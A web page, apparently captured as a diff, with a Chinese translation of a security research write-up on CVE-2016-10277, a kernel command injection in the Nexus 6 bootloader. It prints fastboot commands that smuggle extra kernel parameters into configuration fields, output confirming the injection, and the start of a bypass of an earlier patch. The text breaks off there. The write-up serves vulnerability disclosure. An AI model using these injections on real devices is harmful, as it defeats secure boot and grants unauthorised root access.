@@ -1,0 +1,866 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【漏洞分析】如何通过内核命令注入绕过Nexus 6的安全启动模式（含演示视频） - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="Nexus漏洞,android安全,android系统安全"/>
+    
+        <meta name="description" content="2017年5月的Android安全公告中，Google发布了一个安全补丁，修复了我们之前在Nexus 6的bootloader中发现的一个严重的漏洞。利用这个漏洞，攻击者能够打破设备的安全（或已验证的）启动机制，通过加载一个精心构造的恶意initramfs镜像，攻击者可以获得目标设备的root权限。本篇文章为针对该漏洞的分析。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【漏洞分析】如何通过内核命令注入绕过Nexus 6的安全启动模式（含演示视频）</h2>
+                <div class="article-msg">
+                    <span class="time">2017-05-27 13:33:38</span>
+                    
+                                        <span class="read">阅读：21787次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3917"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3917" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="https://alephsecurity.com/2017/05/23/nexus6-initroot/"
+                             target="_blank">来源： alephsecurity.com</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2819002922" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t0104d1b8b4ca36e961.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2819002922" style="color:#848e99;">興趣使然的小胃</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p9.qhimg.com/t01c4969c1fd9a2d2e7.jpg" title="t01d5fd22b651a9c337.jpg" alt="http://p9.qhimg.com/t01d5fd22b651a9c337.jpg"/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2819002922" target="_blank" textvalue="興趣使然的小胃"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">興趣使然的小胃</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">预估</span><span style="font-weight: 900; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">稿费：200RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在2017年5月的</span><a href="https://source.android.com/security/bulletin/2017-05-01#eop-in-motorola-bootloader" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Android安全公告</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">中，Google发布了一个安全补丁，修复了我们之前在Nexus 6的bootloader中发现的一个严重的漏洞（</span><a href="https://alephsecurity.com/vulns/aleph-2017011" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CVE-2016-10277</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">）。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">利用这个漏洞，物理攻击者或者某个已拥有（bootloader锁定下）目标设备ADB/fastboot USB访问权限的用户（比如恶意软件可以等待具备ADB权限的开发者设备通过USB接口插入主机）能够打破设备的安全（或已验证的）启动机制，通过加载一个精心构造的恶意initramfs镜像，攻击者可以获得目标设备的root权限，完全控制设备的用户空间（在这个空间可以实施更多攻击）。此外，漏洞利用过程并不会导致设备恢复到出厂设置，因此用户数据会保持不变（并且仍然处于加密状态）。需要注意的是，我们所演示的并不是一个不受任何条件限制的攻击过程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在漏洞研究过程中，我们同时也</span><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#anecdote-a-linux-kernel-out-of-bounds-write-cve-2017-1000363" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">发现</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">了一个已有18年历史的Linux内核漏洞（漏洞不会对Nexus 6造成影响，因此可能不会影响任何Android设备）：</span><a href="https://alephsecurity.com/vulns/aleph-2017023" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CVE-2017-1000363</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在本文开始前，我们可以先看一下PoC演示视频：</span></p><p style="text-align: center;"><iframe class="iframe_auto_size" src="http://player.youku.com/embed/XMjc4ODQxNzg2NA==" frameborder="0" allowfullscreen=""></iframe></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一、前言</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2017年1月，我们</span><a href="https://alephsecurity.com/2017/01/05/attacking-android-custom-bootmodes/" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">披露</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">了一个高危漏洞（</span><a href="https://alephsecurity.com/vulns/aleph-2016002" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CVE-2016-8467</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">），这个漏洞影响Nexus 6/6P，允许攻击者改变设备的启动模式，从而能够访问设备的隐藏USB接口。漏洞通过fastboot命令触发（比如fastboot oem config bootmode bp-tools），该命令会导致bootloader改变内核命令行中的androidboot.mode参数。Google通过加固bootloader修复了这个漏洞，锁定后的bootloader再也不支持自定义启动模式启动。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">二、漏洞分析：内核命令注入漏洞（CVE-2016-10277）</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Nexus 6的bootloader中包含许多参数，其中某些参数可以通过fastboot接口进行控制，即使bootloader被锁定也可以：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;fastboot&nbsp;oem&nbsp;config
+[...]
+(bootloader)&nbsp;&lt;UTAG&nbsp;name=&quot;battery&quot;&nbsp;protected=&quot;false&quot;&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;description&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Battery&nbsp;detection&nbsp;control
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(&quot;meter_lock&quot;&nbsp;or&nbsp;&quot;no_eprom&quot;)
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/description&gt;
+(bootloader)&nbsp;&lt;/UTAG&gt;
+(bootloader)&nbsp;&lt;UTAG&nbsp;name=&quot;bootmode&quot;&nbsp;protected=&quot;false&quot;&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;description&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;To&nbsp;force&nbsp;certain&nbsp;bootmode
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(valid&nbsp;values&nbsp;are&nbsp;&quot;fastboot&quot;,&nbsp;&quot;factory&quot;,&nbsp;&quot;bp-tools&quot;,&nbsp;&quot;q
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;com&quot;,&nbsp;and&nbsp;&quot;on-device-diag&quot;)
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/description&gt;
+(bootloader)&nbsp;&lt;/UTAG&gt;
+(bootloader)&nbsp;&lt;UTAG&nbsp;name=&quot;carrier&quot;&nbsp;protected=&quot;false&quot;&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;description&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Carrier&nbsp;IDs,&nbsp;see&nbsp;http://goo.gl/lojLh3
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/description&gt;
+(bootloader)&nbsp;&lt;/UTAG&gt;
+(bootloader)&nbsp;&lt;UTAG&nbsp;name=&quot;console&quot;&nbsp;type=&quot;str&quot;&nbsp;protected=&quot;false&quot;&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;description&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Config&nbsp;kernel&nbsp;console&nbsp;log
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable|true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;enable&nbsp;with&nbsp;default&nbsp;settings
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;disable|false&nbsp;&nbsp;&nbsp;-&nbsp;disable
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;config&nbsp;string&gt;&nbsp;-&nbsp;enable&nbsp;with&nbsp;customized&nbsp;settings
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(e.g.:&nbsp;&quot;ttyHSL0&quot;,&nbsp;&quot;ttyHSL0,230400,n8&quot;)
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/description&gt;
+(bootloader)&nbsp;&lt;/UTAG&gt;
+(bootloader)&nbsp;&lt;UTAG&nbsp;name=&quot;fsg-id&quot;&nbsp;type=&quot;str&quot;&nbsp;protected=&quot;false&quot;&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;description&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FSG&nbsp;IDs,&nbsp;see&nbsp;http://goo.gl/gPmhU
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/description&gt;
+(bootloader)&nbsp;&lt;/UTAG&gt;
+OKAY&nbsp;[&nbsp;&nbsp;0.048s]
+finished.&nbsp;total&nbsp;time:&nbsp;0.048s</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">fsg-id、carrier以及console这三个参数可以包含任意值（虽然参数的大小受到限制），这三个参数最终会被传递到内核命令行。我们可以使用以下命令来验证这个漏洞：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;fastboot&nbsp;oem&nbsp;config&nbsp;console&nbsp;foo
+$&nbsp;fastboot&nbsp;oem&nbsp;config&nbsp;fsg-id&nbsp;bar
+$&nbsp;fastboot&nbsp;oem&nbsp;config&nbsp;carrier&nbsp;baz</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后检查内核命令行：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">shamu:/&nbsp;$&nbsp;dmesg&nbsp;|&nbsp;grep&nbsp;command
+[&nbsp;&nbsp;&nbsp;&nbsp;0.000000]&nbsp;Kernel&nbsp;command&nbsp;line:&nbsp;console=foo,115200,n8&nbsp;earlyprintk&nbsp;
+androidboot.console=foo&nbsp;androidboot.hardware=shamu&nbsp;msm_rtb.filter=0x37
+ehci-hcd.park=3&nbsp;utags.blkdev=/dev/block/platform/msm_sdcc.1/by-name/utags
+utags.backup=/dev/block/platform/msm_sdcc.1/by-name/utagsBackup&nbsp;coherent_pool=8M
+vmalloc=300M&nbsp;buildvariant=user&nbsp;androidboot.bootdevice=msm_sdcc.1&nbsp;androidboot.serialno=ZX1G427V97
+androidboot.baseband=mdm&nbsp;androidboot.version-baseband=D4.01-9625-05.45+FSG-9625-02.117
+androidboot.mode=normal&nbsp;androidboot.device=shamu&nbsp;androidboot.hwrev=0x83A0
+androidboot.radio=0x7&nbsp;androidboot.powerup_reason=0x00004000&nbsp;androidboot.bootreason=reboot
+androidboot.write_protect=0&nbsp;restart.download_mode=0&nbsp;androidboot.fsg-id=bar
+androidboot.secure_hardware=1&nbsp;androidboot.cid=0xDE&nbsp;androidboot.wifimacaddr=F8:CF:C5:9F:8F:EB
+androidboot.btmacaddr=F8:CF:C5:9F:8F:EA&nbsp;mdss_mdp.panel=1:dsi:0:qcom,mdss_dsi_mot_smd_596_QHD_dualmipi0_cmd_v0
+androidboot.bootloader=moto-apq8084-72.02&nbsp;androidboot.carrier=baz&nbsp;androidboot.hard&lt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在，如果bootloader没有对这些参数进行过滤处理，那么我们就能传递任意内核内核命令行参数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;fastboot&nbsp;oem&nbsp;config&nbsp;console&nbsp;&quot;a&nbsp;androidboot.foo=0&nbsp;&quot;
+$&nbsp;fastboot&nbsp;oem&nbsp;config&nbsp;fsg-id&nbsp;&quot;a&nbsp;androidboot.bar=1&quot;
+$&nbsp;fastboot&nbsp;oem&nbsp;config&nbsp;carrier&nbsp;&quot;a&nbsp;androidboot.baz=2&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">结果的确如此：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">shamu:/&nbsp;$&nbsp;dmesg&nbsp;|&nbsp;grep&nbsp;command
+[&nbsp;&nbsp;&nbsp;&nbsp;0.000000]&nbsp;Kernel&nbsp;command&nbsp;line:&nbsp;console=a&nbsp;androidboot.foo=0&nbsp;,115200,n8&nbsp;earlyprintk&nbsp;
+androidboot.console=a&nbsp;androidboot.foo=0&nbsp;&nbsp;androidboot.hardware=shamu&nbsp;msm_rtb.filter=0x37
+ehci-hcd.park=3&nbsp;utags.blkdev=/dev/block/platform/msm_sdcc.1/by-name/utags
+utags.backup=/dev/block/platform/msm_sdcc.1/by-name/utagsBackup&nbsp;coherent_pool=8M
+vmalloc=300M&nbsp;buildvariant=user&nbsp;androidboot.bootdevice=msm_sdcc.1&nbsp;androidboot.serialno=ZX1G427V97
+androidboot.baseband=mdm&nbsp;androidboot.version-baseband=D4.01-9625-05.45+FSG-9625-02.117
+androidboot.mode=normal&nbsp;androidboot.device=shamu&nbsp;androidboot.hwrev=0x83A0
+androidboot.radio=0x7&nbsp;androidboot.powerup_reason=0x00004000&nbsp;androidboot.bootreason=reboot
+androidboot.write_protect=0&nbsp;restart.download_mode=0&nbsp;androidboot.fsg-id=a&nbsp;androidboot.bar=1
+androidboot.secure_hardware=1&nbsp;androidboot.cid=0xDE&nbsp;androidboot.wifimacaddr=F8:CF:C5:9F:8F:EB
+androidboot.btmacaddr=F8:CF:C5:9F:8F:EA&nbsp;mdss_mdp.panel=1:dsi:0:qcom,mdss_dsi_mot_smd_596_QHD_dualmipi0_cmd_v0
+androidboot.bootloader=moto-apq8084-72.02&nbsp;androidboot.carrier=a&nbsp;androidboot.baz=2&nbsp;androidboot.hard&lt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">正如我们所料，我们可以将ro.boot属性设为任意值：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">shamu:/&nbsp;$&nbsp;getprop&nbsp;ro.boot.foo
+0
+shamu:/&nbsp;$&nbsp;getprop&nbsp;ro.boot.bar
+1
+shamu:/&nbsp;$&nbsp;getprop&nbsp;ro.boot.baz
+2
+shamu:/&nbsp;$</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">三、绕过CVE-2016-8467的补丁</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">到目前为止，我们可以轻易绕过</span><a href="https://alephsecurity.com/vulns/aleph-2016002" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CVE-2016-8467</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">的补丁：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;fastboot&nbsp;oem&nbsp;config&nbsp;console&nbsp;&quot;a&nbsp;androidboot.mode=bp-tools&nbsp;&quot;
+[...]
+(bootloader)&nbsp;&lt;UTAG&nbsp;name=&quot;conolse&quot;&nbsp;type=&quot;str&quot;&nbsp;protected=&quot;false&quot;&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;androidboot.mode=bp-tools
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;description&gt;
